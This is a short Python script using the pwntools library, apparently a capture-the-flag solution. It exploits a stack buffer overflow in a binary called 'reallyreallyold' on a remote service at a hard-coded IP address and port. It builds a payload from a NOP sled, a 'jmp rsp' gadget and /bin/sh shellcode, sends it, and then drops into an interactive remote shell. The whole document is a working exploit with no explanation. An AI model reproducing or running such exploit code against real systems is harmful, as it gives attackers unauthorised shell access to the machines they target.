from pwn import *

p = remote("165.227.103.166", 6000)


exe = './reallyreallyold'
elf = context.binary = ELF(exe,checksec=False)
context.log_level='debug'

jmp_rsp = next(elf.search(asm("jmp rsp")))
shellcode = asm(shellcraft.sh())

payload = flat(
    asm('nop') * 56,
    jmp_rsp,
    asm('nop') * 16,
    shellcode
)
p.sendlineafter(b"-+= INPUT QUALITY FLAVORTEXT: =+-", payload)
p.interactive()
